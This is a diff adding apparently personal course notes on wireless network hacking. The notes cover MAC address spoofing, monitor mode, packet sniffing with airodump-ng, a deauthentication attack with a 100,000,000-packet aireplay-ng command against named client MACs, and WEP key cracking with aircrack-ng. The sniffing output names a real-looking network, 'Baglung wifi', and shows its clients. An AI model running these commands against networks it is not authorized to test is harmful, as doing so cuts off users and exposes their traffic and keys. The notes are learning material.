@@ -1,0 +1,152 @@
+Peneratation Testing
+
+i. Network Hacking
+    a. Pre-connection attacks
+    b. Gaining access
+    c. Post-connection attacks
+
+
+Wireless Adapter
+Needed for;
+-> Network Hacking > Gaining Access > WEP Cracking
+-> Network Hacking > Gaining Access > WPA/WPA2 Cracking
+
+
+Wireless adapter requirements:
+-> Monitor mode.
+-> Packet injection.
+-> AP mode.
+
+
+Why Change MAC Address?
+-> Increate anonymity
+-> Impersonate other devices
+-> Bypass filters
+
+Changing the MAC Address?
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+ifconfig
+iwconfig
+
+-> it only works until restart the pc because actual mac address can't be changed it can be
+change temporarily.
+
+
+Changing External Wireless Adapter package mode from managed to monitor mode?
+ifconfig wlan0 down
+airmon-ng check kill
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig
+
+
+Pre Connection Attacks
+
+Packet Sniffing - Using AIRODUMP-NG
+-> Part of the aircrack-ng suit.
+-> Airodump-ng is a packet sniffer;
+-> Used to capture all packets within range.
+-> Display detailed info about networks around us.
+-> Connected clients etc.
+
+Use
+-> airodump-ng[MonitorModelInterface]
+
+Discover networks??
+airodump-ng wlan0
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSI
+
+ 54:37:BB:95:DF:4D   -1        0        4    1  11   -1   WPA              <len
+ CC:BA:BD:47:5D:4C  -82        4        0    0  10  270   WPA2 CCMP   PSK  TP-L
+ A8:42:A1:68:08:9E  -82        6        0    0  10  270   WPA2 CCMP   PSK  MASS
+ 2C:9D:1E:04:7C:A8  -83       11        0    0   7  270   WPA2 CCMP   PSK  nirm
+ B4:1D:62:B2:3F:6D  -81        8        0    0  11  130   WPA2 CCMP   PSK  phil
+
+
+ Wifi BANDS
+ -> Decides the frequency range that can be used.
+ -> Determines the channels that can be used.
+ -> Clients need to support band used by router to communicate with it.
+ -> Data can be sniffed from a certain band if the wireless adapter used supports that band.
+ -> Most common Wifi bands are:
+    * a uses 5 Ghz frequency only.
+    * b,g both use 2.4 ghz frequency only.
+    * n uses 5 and 2.4 GHZ
+    * ac uses frequency
+
+Discover 5GHZ networks also?
+airodump-ng --band a wlan0
+airodump-ng --band abg wlan0
+
+
+
+Lets target the wireless network??
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSI
+ F8:0C:58:BB:7F:A5  -33       41        4    0  64  866   WPA2 CCMP   PSK  Baglung wifi
+
+airodump-ng --bssid F8:0C:58:BB:7F:A5 --channel 64 --write test wlan0
+
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ F8:0C:58:BB:7F:A5  -34  65     1855      433    2  64  866   WPA2 CCMP   PSK  Baglung wifi
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ F8:0C:58:BB:7F:A5  6E:B6:7F:2C:0C:C8  -45    6e- 6      0      247
+ F8:0C:58:BB:7F:A5  B2:52:FB:CC:5B:FC  -75   24e-24   2543     1648
+ F8:0C:58:BB:7F:A5  DA:15:98:5F:DA:84  -42    6e-24   6726     1678
+
+
+DE-Authentication Attack
+-> Disconnect any client from any network
+    * Works on encrypted networks(WEP,WPA & WPA2)
+    * No need to know the network key.
+    * No need to connect to the network.
+
+use:
+aireplay-ng --deauth [#DeauthPackets] -a [NetworkMac] -c [TargetMac]  [Interface]
+aireplay-ng --deauth 100000000 -a F8:0C:58:BB:7F:A5 -c DA:15:98:5F:DA:84 wlan0
+
+
+
+--------------------------------------------------------------------------------------------
+Gaining Access - WEP Cracking
+
+WEP Cracking
+-> Wired Equivalent Privacy
+-> Old encryption
+-> Uses an algorithm called RC4.
+-> Still used in some networks.
+-> Can be cracked easily.
+
+-> Client encrypts data using a key.
+-> Encrypted packet sent in the air.
+-> Router decrypts packet using the key.
+
+-> Each packet is encrypted using a unique key stream.
+-> Random initialization vector(IV) is used to generate the keys streams.
+-> The initialization vector is only 24 bits.
+-> IV + Key(password) = Key Stream
+
+-> IV is too small(only 24 bits)
+-> IV is sent in plain text.
+
+Result:
+-> IV's will repeat on busy networks.
+-> This makes WEP vulnerable to statistical attacks.
+-> Repeated IVs can be used to determine the key stream;
+-> And break the encryption.
+
+
+Conclusion:
+-> To crack WEP we need to:
+i. Capture a large number of packets/IVs(using airodump-ng).
+ii. Analyse the captured IVs and crack the key(using aircrack-ng).
+
+airodump-ng --bssid F8:0C:58:BB:7F:A5 --channel 64 --write basic_wep wlan0
+aircrack-ng basic_wep-01.cap
+
+
+
